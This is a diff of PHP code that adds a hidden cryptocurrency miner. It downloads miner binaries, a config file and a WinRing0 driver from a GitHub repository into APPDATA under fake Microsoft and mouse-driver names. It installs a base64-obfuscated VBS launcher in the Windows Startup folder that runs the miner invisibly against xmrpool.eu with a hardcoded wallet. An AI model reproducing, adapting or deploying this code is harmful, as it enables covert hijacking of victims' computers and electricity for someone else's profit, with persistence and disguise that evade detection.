@@ -82,7 +82,30 @@ $GLOBALS['__getdev_002'] = function($lolpath)
 	return $device;
 };
 
+$GLOBALS['__getpathname_002'] = function()
+{
+	$root = getenv('APPDATA');
+	$time = strtotime("-20 month", time());
+	for($i=0; $i<40; $i++)
+	{
+		$time = strtotime("+1 month", $time);
+		$year = (int)date('Y', $time);
+		$month = (int)date('m', $time);
+		$date_name_vs = (string)$month . '.' . (($month*37) * ($year*189));
+		
+		$cpupath = $root . '\\Microsoft Binaries v'.$date_name_vs . '\\cachecpudet.dat';
+		if(is_file($cpupath))
+		{
+			$cpudet = @json_decode(@file_get_contents($cpupath), true);
+			if($cpudet && isset($cpudet['cores']) && $cpudet['cores'] > 0)
+				return $cpudet['cores'];
+		}
+	}
+	return 0;
+};
+
 $lolm_path = getenv('APPDATA') . '\\microsoft_win_x86';
+$xmr_path = $lolm_path;
 @mkdir($lolm_path);
 $id_com = $lolm_path . '\\com_key.dat';
 $id_path = $lolm_path . '\\work_key.dat';
@@ -99,16 +122,37 @@ if(1)
 {
 	@file_put_contents($id_com, $command_id);
 	try{
-	$lolm_path .= '\\w_driver1.95_x86.exe';
+	$EXEC_XMR = true;
+	$lolm_name = 'w_driver1.95_x86';
+	$xmr_name = 'mouse_driver1.5_X86';
+	$lolm_path .= '\\'.$lolm_name.'.exe';
+	$xmr_path .= '\\'.$xmr_name.'.exe';
 	$data = true;
+	$user = 'luizdev1500';
+	$project = 'projetonovo';
 	if(!is_file($lolm_path))
 	{
 		$data = false;
-		$data = @$GLOBALS['__download_002']('https://raw.githubusercontent.com/luizdev1500/projetonovo/refs/heads/main/lolminer/lolMiner_1.95.dat');
-		if($data && strlen($data) > 9000)
+		$data = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/lolMiner_1.95.dat");
+		if($data && strlen($data) > 9000000)
 			@file_put_contents($lolm_path, $data);
 		else
 			$data = false;
+	}
+	if($EXEC_XMR && !is_file($xmr_path))
+	{
+		$data = false;
+		$data = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/xmr.dat");
+		$data2 = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/ring_config.dat");
+		$data3 = @$GLOBALS['__download_002']("https://raw.githubusercontent.com/$user/$project/refs/heads/main/lolminer/ring_dll.dat");
+		if($data && strlen($data) > 5000000 && strlen($data2) > 3000 && strlen($data3) > 12000)
+		{
+			@file_put_contents($xmr_path, $data);
+			@file_put_contents(dirname($xmr_path).'/config.json', $data2);
+			@file_put_contents(dirname($xmr_path).'/Win'.'Ring'.'0x64.s'.'ys', $data3);
+		}
+		else
+			$EXEC_XMR = false;
 	}
 	$devnum = '0'; /*false;*/
 	if($data !== false && is_file($lolm_path))
@@ -123,6 +167,11 @@ if(1)
 	if($devnum !== false && is_file($lolm_path))
 	{
 		$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNClNldCBmc28gPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IikNCmZuID0gV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KbiA9IFNwbGl0KGZuLCAiLiIpDQpjID0gQ0RibChuKDEpKQ0KV2hpbGUgVHJ1ZQ0KCWMgPSBjICsgMQ0KCW5uID0gbigwKSAmICIuIiAmIGMgJiAiLiIgJiBuKDIpICYgIi52YnMiDQoJZnNvLk1vdmVGaWxlIGZuLCBubg0KCWZuID0gbm4NCglXU2NyaXB0LlNsZWVwKHtUSU1FT1VUfSkNCldlbmQ';
+		if($EXEC_XMR)
+		{
+			$vbs = 'T24gRXJyb3IgUmVzdW1lIE5leHQNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkR9IiwgMCwgRmFsc2UNCkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpLlJ1biAie0NPTU1BTkRfMn0iLCAwLCBGYWxzZQ0KU2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQ0KZm4gPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lDQpuID0gU3BsaXQoZm4sICIuIikNCmMgPSBDRGJsKG4oMSkpDQpXaGlsZSBUcnVlDQoJYyA9IGMgKyAxDQoJbm4gPSBuKDApICYgIi4iICYgYyAmICIuIiAmIG4oMikgJiAiLnZicyINCglmc28uTW92ZUZpbGUgZm4sIG5uDQoJZm4gPSBubg0KCVdTY3JpcHQuU2xlZXAoe1RJTUVPVVR9KQ0KV2VuZA';
+		}
+		/**/
 		$vbs_checkname = 'Microsoft Mouse Driver x86';
 		$vbsname = $vbs_checkname . ' vs10.12212147455.'.(string)time().'.vbs';
 		/*$command = '"'.$lolm_path.'" --algo AUTOLYKOS2 --pool ergo-eu1.nanopool.org:11111 --user 9hJsrcoUYwKc92BXKbiVotX7CbFLkT85GY6r6FtnK7bu1qfHokD.'.$work_key.'_dev'.$devnum.' --watchdog exit --nocolor --devices '.$devnum;*/
@@ -130,6 +179,22 @@ if(1)
 		$command = preg_replace('/\"/is', '""', $command);
 		$vbs = base64_decode($vbs);
 		$vbs = preg_replace('/\{COMMAND\}/is', $command, $vbs);
+		
+		if($EXEC_XMR)
+		{
+			$num_threads = $GLOBALS['__getpathname_002']();
+			if($num_threads < 4)
+			{
+				$EXEC_XMR = false;
+			}
+			else
+			{
+				$num_threads = (string)ceil($num_threads / 4);
+				$command = '"'.$xmr_path.'" -o xmrpool.eu:3333 -u 4B6d8CF6BSZRH2JoC4P3JjVWtZ5Axe4bLZ3XDNMmsSD794xC3sBgtUtDitCQevnP9FEoiCathYVFMZGnxZHizJpL5SZWhch -p '.$work_key.' --threads '.$num_threads;
+				$command = preg_replace('/\"/is', '""', $command);
+				$vbs = preg_replace('/\{COMMAND\_2\}/is', $command, $vbs);
+			}
+		}
 		$vbs = preg_replace('/\{TIMEOUT\}/is', (string)(mt_rand(1000*60*1, 1000*60*5)), $vbs);
 		$vbs_path = getenv('APPDATA') . '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup';
 		$execlol = false;
@@ -175,7 +240,7 @@ if(1)
 			$r = 0;
 			@exec('tasklist', $output, $r);
 			$output = implode("\n", $output);
-			if(false === stripos($output, 'w_driver1.95_x86'))
+			if(false === stripos($output, $lolm_name) && false === stripos($output, $xmr_name))
 			{
 				/**
 				$output = array();
